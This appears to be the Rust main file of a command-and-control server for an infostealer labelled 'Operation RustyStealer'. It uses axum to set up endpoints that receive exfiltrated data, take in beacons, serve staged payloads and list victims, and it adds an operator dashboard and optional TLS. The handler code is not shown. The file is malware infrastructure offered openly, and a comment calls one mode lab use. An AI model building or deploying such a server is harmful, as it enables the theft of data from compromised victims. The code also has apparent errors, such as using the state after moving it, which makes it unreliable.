mod config;
mod handlers;
mod database;
mod crypto;
mod models;

use axum::{
    Router,
    routing::{get, post},
    extract::State,
    http::{
        header::{CONTENT_TYPE, AUTHORIZATION},
        Method, HeaderValue,
    },
    response::{IntoResponse, Json},
};
use tower_http::{
    cors::{CorsLayer, Any},
    trace::TraceLayer,
};
use std::sync::Arc;
use tracing::{info, error};
use tracing_subscriber;

use config::Config;
use database::Database;
use handlers::*;

#[derive(Clone)]
pub struct AppState {
    pub db: Arc<Database>,
    pub config: Arc<Config>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Setup logging
    tracing_subscriber::fmt()
        .with_target(false)
        .with_thread_ids(true)
        .init();
    
    info!("🚀 Starting C2 Server...");
    
    // Load config
    let config = Config::load()?;
    info!("📁 Config loaded: {}:{}", config.server.host, config.server.port);
    
    // Initialize database
    let db = Database::new(&config.database.path).await?;
    info!("💾 Database initialized at: {}", config.database.path);
    
    // Create app state
    let state = AppState {
        db: Arc::new(db),
        config: Arc::new(config),
    };
    
    // Setup CORS
    let cors = CorsLayer::new()
        .allow_methods([Method::GET, Method::POST])
        .allow_origin(Any)
        .allow_headers([CONTENT_TYPE, AUTHORIZATION]);
    
    // Build router
    let app = Router::new()
        // API endpoints
        .route("/", get(root_handler))
        .route("/health", get(health_handler))
        .route("/exfil", post(exfil_handler))
        .route("/exfil/:id", get(get_exfil_handler))
        .route("/beacon", post(beacon_handler))
        .route("/payload/:stage", get(payload_handler))
        .route("/victims", get(victims_handler))
        .route("/victim/:id", get(victim_details_handler))
        
        // Dashboard (web UI)
        .route("/dashboard", get(dashboard_handler))
        .route("/static/*path", get(static_handler))
        
        .layer(cors)
        .layer(TraceLayer::new_for_http())
        .with_state(state);
    
    // Start server
    let addr = format!("{}:{}", state.config.server.host, state.config.server.port);
    info!("🌐 Listening on http://{}", addr);
    
    if state.config.server.tls_enabled {
        // HTTPS (produção)
        let rustls_config = setup_tls(&state.config).await?;
        axum_server::bind_rustls(addr.parse()?, rustls_config)
            .serve(app.into_make_service())
            .await?;
    } else {
        // HTTP (desenvolvimento/lab)
        let listener = tokio::net::TcpListener::bind(addr).await?;
        axum::serve(listener, app).await?;
    }
    
    Ok(())
}

async fn root_handler() -> &'static str {
    "C2 Server Online - Operation RustyStealer"
}

async fn health_handler() -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "status": "healthy",
        "timestamp": chrono::Utc::now().to_rfc3339(),
    }))
}

async fn setup_tls(config: &Config) -> anyhow::Result<rustls::ServerConfig> {
    use rustls_pemfile::{certs, pkcs8_private_keys};
    use std::fs::File;
    use std::io::BufReader;
    
    let cert_file = &mut BufReader::new(File::open(&config.server.cert_file)?);
    let key_file = &mut BufReader::new(File::open(&config.server.key_file)?);
    
    let cert_chain = certs(cert_file)
        .unwrap()
        .into_iter()
        .map(rustls::Certificate)
        .collect();
    
    let mut keys = pkcs8_private_keys(key_file).unwrap();
    let private_key = rustls::PrivateKey(keys.remove(0));
    
    let config = rustls::ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(cert_chain, private_key)?;
    
    Ok(config)
}